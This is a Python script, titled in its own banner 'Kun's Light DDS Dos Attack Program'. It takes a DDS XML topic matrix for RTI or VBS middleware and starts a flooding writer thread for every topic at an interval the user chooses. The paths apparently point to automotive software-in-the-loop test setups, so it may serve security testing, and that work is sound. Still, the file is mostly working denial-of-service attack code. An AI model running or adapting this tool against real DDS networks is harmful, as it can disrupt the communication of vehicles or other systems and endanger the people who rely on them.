# -*- coding: utf-8 -*-
# @Author  : Li Kun
# @Time    : 2024/5/16 16:56
# @File    : dos.py

import time
from protocol.rtidds.rtiddssil import *
from protocol.lidds.liddssil import *
from protocol.rtidds.rtiddsxmlparser import ParseXML
from protocol.lidds.liddsxmlparser import Parser
from settings import env


class WriterPool:
    writer_threads = []


def attack_rti(filepath, interval):
    dds_xml_obj = ParseXML(xml_filepath=filepath)
    for topic_name in list(dds_xml_obj.topic2signal.keys()):  # ['WarningInfo']
        pub_connector = rti.Connector(config_name="SoaParticipantLibrary::SoaPubParticipant", url=filepath)
        writer = RtiDDSWriterDoS(pub_connector, topic_name, interval=interval, dds_xml_obj=dds_xml_obj)
        writer.start()
        WriterPool.writer_threads.append(writer)
        print(f'{topic_name} datawriter created ............................')


def attack_vbs(filepath, interval):
    dds_xml_obj = Parser(filepath)
    proxy = vbs.VBSPythonDynamicProxy().getInstance()
    proxy.LoadXML(filepath)
    participant_name = 'mySubscriber'
    participant = proxy.CreateDomainParticipantWithProfile_v2(filepath, participant_name)
    for topic_name in dds_xml_obj.topic2signal.keys():
        prefix_topic_name = f'Topic_{topic_name}' if env.has_topic_prefix else topic_name
        topic_profile = dds_xml_obj.get_topic_profile_name(topic_name)
        topic_datatype = dds_xml_obj.get_topic_datatype(topic_name)
        writer_profile = dds_xml_obj.get_writer_profile_name(topic_name)
        tmp = proxy.CreateDynamicData(topic_datatype)
        dyn_data = vbs.VBSPythonDynamicData(tmp)
        dyn_type = dyn_data.GetVBSType()
        topic = proxy.CreateTopicWithProfile_v2(participant, prefix_topic_name, topic_datatype, dyn_type, topic_profile)
        writer = evbsWriterDoS(
            proxy,
            participant,
            prefix_topic_name,
            topic_datatype,
            writer_profile,
            topic,
            dyn_data,
            dds_xml_obj,
            interval=interval
        )
        writer.start()
        WriterPool.writer_threads.append(writer)


if __name__ == '__main__':
    print("Kun's Light DDS Dos Attack Program")
    protocol_type = int(input('请选择DDS协议类型 [1] rti  [2] vbs  :'))
    xml_filepath = input('请输入DDS XML矩阵文件路径:').replace('"', '')
    interval = float(input('请输入攻击间隔（单位: 秒）:'))
    has_prefix = input('是否带Topic_前缀? y/n :')
    if 'y' in has_prefix.lower():
        env.has_topic_prefix = True
    else:
        env.has_topic_prefix = False

    if protocol_type == 1:
        attack_rti(xml_filepath, interval)
    elif protocol_type == 2:
        attack_vbs(xml_filepath, interval)
    else:
        input('请选择DDS协议类型选择错误，请退出后重新选择')

    # 攻击间隔
    interval = 0
    # rti dos
    filepath = r"D:\Project\soa-sil-xbp\data\matrix\rti_XAP241&XPP361.xml"
    # lidds dos
    # filepath = r"D:\Project\soa-sil-xbp\data\matrix\vbs_XBP2.2.0.xml"

    # 攻击时长 单位分钟
    # print('++++++++++++++++++++++++++++++++++++')
    # time.sleep(60)  # 等writer_threads中的线程齐了
    # print('===================================')
    # print(WriterPool.writer_threads)
    # for w in WriterPool.writer_threads:
    #     w.stop()
    #     w.join()
